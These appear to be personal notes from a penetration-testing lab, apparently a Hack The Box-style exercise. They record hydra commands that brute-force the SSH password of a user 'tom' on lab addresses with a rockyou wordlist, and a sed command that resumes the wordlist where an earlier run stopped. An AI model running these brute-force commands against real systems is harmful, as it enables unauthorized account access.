- `hydra -l tom -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-60.txt 10.129.64.82 ssh -t 4 -I`
![[Pasted image 20240828170837.png]]
- create wordlist from line where I finished
```
sed -n '5913,$p' /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-60.txt >  rockyou-60_after_5912.txt 
```
- and one more round    `hydra -l tom -P rockyou-60_after_5912.txt 10.129.142.86 ssh -t 4 -I`
- `hydra -l tom -P rockyou-60_processing.txt 10.129.229.147 ssh -t 4`
![[Pasted image 20240902171953.png]]